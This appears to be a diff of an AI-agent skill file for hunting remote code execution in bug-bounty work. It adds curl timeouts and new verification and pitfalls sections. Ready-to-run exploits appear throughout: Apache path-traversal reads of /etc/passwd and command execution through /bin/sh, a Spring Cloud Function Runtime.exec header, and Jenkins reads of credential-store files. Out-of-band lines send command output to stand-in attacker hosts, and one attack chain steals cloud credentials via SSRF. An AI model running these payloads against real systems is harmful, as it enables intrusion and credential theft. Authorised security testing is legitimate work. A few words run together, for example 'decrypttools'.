@@ -1,8 +1,11 @@
 ---
 name: hunt-rce
 description: "Hunting skill for rce vulnerabilities. Built from 67 public bug bounty reports. Use when hunting rce on any target."
-sources: github, hackerone_public
-report_count: 67
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [rce, hunt, redteam]
 ---
 
 ## When to Use
@@ -127,20 +130,20 @@ Path normalization bug in Apache 2.4.49 (and the 2.4.50 patch-bypass) lets an at
 
 **Version fingerprint:**
 ```bash
-curl -sI http://target/ | grep -i "Server:"
+curl --max-time 30 --connect-timeout 10 -sI http://target/ | grep -i "Server:"
 # Vulnerable: Apache/2.4.49 (CVE-2021-41773) or Apache/2.4.50 (CVE-2021-42013)
 # Patched:    Apache/2.4.51+
 ```
 
 **File-read test (any alias):**
 ```bash
-curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+curl --max-time 30 --connect-timeout 10 --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
 # Note: --path-as-is is REQUIRED — curl normalizes %2e by default
 ```
 
 **RCE test (cgi-enabled alias only):**
 ```bash
-curl --path-as-is -X POST \
+curl --max-time 30 --connect-timeout 10 --path-as-is -X POST \
   -d "echo Content-Type: text/plain; echo; id; uname -a; hostname" \
   "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
 ```
@@ -153,12 +156,12 @@ Spring Cloud Function ≤ 3.2.2 (and ≤ 3.1.6) evaluates the `spring.cloud.func
 
 **Detection:**
 - Spring-style port 8080 with `/uppercase`, `/lowercase`, or arbitrary single-word function endpoints responding 200
-- Confirm with `curl -s http://target:8080/uppercase -H "Content-Type: text/plain" --data-binary "test"` → returns `TEST`
+- Confirm with `curl --max-time 30 --connect-timeout 10 -s http://target:8080/uppercase -H "Content-Type: text/plain" --data-binary "test"` → returns `TEST`
 - Version banner via `/actuator/info` or response headers
 
 **Exploit:**
 ```bash
-curl -X POST http://target:8080/functionRouter \
+curl --max-time 30 --connect-timeout 10 -X POST http://target:8080/functionRouter \
   -H "Content-Type: text/plain" \
   -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' \
   --data "x"
@@ -200,7 +203,7 @@ npm view @target-company/internal-package version 2>/dev/null
 
 ### Kubernetes Exposed API Check
 ```bash
-curl -sk https://TARGET:6443/api/v1/namespaces/default/pods \
+curl --max-time 30 --connect-timeout 10 -sk https://TARGET:6443/api/v1/namespaces/default/pods \
   -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
 kubectl --insecure-skip-tls-verify -s https://TARGET:6443 get pods --all-namespaces
 ```
@@ -208,7 +211,7 @@ kubectl --insecure-skip-tls-verify -s https://TARGET:6443 get pods --all-namespa
 ### Out-of-Band RCE Confirmation
 ```bash
 # Payload to confirm blind RCE via DNS
-curl "http://$(id | base64).YOUR-INTERACTSH-URL/"
+curl --max-time 30 --connect-timeout 10 "http://$(id | base64).YOUR-INTERACTSH-URL/"
 nslookup $(whoami).attacker.com
 wget http://attacker.com/$(cat /etc/hostname)
 ```
@@ -232,7 +235,7 @@ Java CLIs built on the `args4j` library default to `expandAtFiles=true`, which e
 **Test (Jenkins):**
 ```bash
 # Get the legit CLI jar from the target
-curl -sLO http://target:8080/jnlpJars/jenkins-cli.jar
+curl --max-time 30 --connect-timeout 10 -sLO http://target:8080/jnlpJars/jenkins-cli.jar
 
 # First line of file leaks via 'help' error
 java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/etc/passwd
@@ -249,13 +252,13 @@ java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/proc/self/enviro
 **Crown-jewel files after JENKINS_HOME confirmed:**
 - `/var/jenkins_home/secret.key` — master encryption key for stored credentials
 - `/var/jenkins_home/secrets/master.key` — derives the encryption key
-- `/var/jenkins_home/credentials.xml` — credential store (encrypted with secret.key — pair with offline decrypt tools)
+- `/var/jenkins_home/credentials.xml` — credential store (encrypted with secret.key — pair with offline decrypttools)
 - `/var/jenkins_home/users/*/config.xml` — per-user API tokens (often unencrypted)
 - `/var/jenkins_home/jobs/*/config.xml` — pipeline configs that may inline AWS keys, SSH keys, registry tokens
 
 **Pattern generalizes beyond Jenkins.** Any Java service that:
 1. Embeds args4j (most enterprise Java CLIs since 2010s)
-2. Exposes the CLI handler over HTTP (Jenkins, Hudson forks, custom internal tools)
+2. Exposes the CLI handler over HTTP (Jenkins, Hudson forks, custom internaltools)
 3. Returns argument-parsing errors verbatim to the client
 
 → same arbitrary-read primitive applies. Validation via `triage-validation` Reproducibility Gate: confirm the leak on at least 2 distinct commands (e.g., `help` and `connect-node`) and verify the file content actually appears in the response, not just a generic 500.
@@ -408,7 +411,7 @@ RCE in 2020-2026 rarely arrives at a single sink. Every modern RCE is composed o
 ### Chain 1 — SSRF + IMDSv1 + Leaked IAM Role → Lambda Invoke → Backend RCE (Capital One pattern)
 
 - **A.** SSRF on a server-side fetcher (link-preview, image proxy, webhook URL, PDF generator). Confirmed via Burp Collaborator OOB callback.
-- **B.** Point SSRF at AWS IMDSv1 metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
+- **B.** Point SSRF at AWS IMDSv1 metadata: `http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
 - **C.** Use the credentials with `aws lambda invoke --function-name <internal-function>` — Lambda runs server-side code that the attacker can influence via the function's input parameter.
 - **Impact:** Full backend RCE in the Lambda context, plus pivot path to whatever else the role grants (S3 / DynamoDB / RDS).
 - **Real shape:** Capital One 2019 — $80M civil penalty, attacker conviction. SSRF in a WAF on EC2 → IMDSv1 → IAM role → 106M-record breach via S3 sync. Cross-refs `hunt-ssrf` Disclosed Report Citation #6.
@@ -465,6 +468,39 @@ Cross-references:
 - `hunt-sharepoint` + `hunt-aspnet` — Chain 5
 - `hunt-xxe` — Chain 6
 - `hunt-deserialization` — YAML/XML/Ruby/Java deserialization is a parallel path to RCE. Chain primitive: SnakeYAML `!!javax.script.ScriptEngineManager` gadget with attacker-hosted JAR → RCE on any Java service processing YAML; Python pickle `__reduce__` → RCE on any Python service unpickling attacker bytes.
+
+---
+
+## Verification
+
+Run this self-test to confirm rce hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-rce" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **Command injection in non-production environment** — `; id` returning the username is not RCE unless you can escalate to arbitrary command execution.
+- **eval/exec with partially controlled input** — if only part of the input reaches eval, the exploit may be harder. Document what you control.
+- **OOB RCE without confirmation** — `curl attacker.com` in a blind RCE proves command execution. DNS-only callback is weaker evidence.
+- **Deserialization RCE without gadget chain** — `ysoserial URLDNS` proves deserialization, not RCE. Need a Runtime.exec gadget.
+- **Template injection without code execution** — `{{7*7}}` returning 49 proves SSTI. Need to escalate to actual code execution for RCE severity.
 
 ---
 
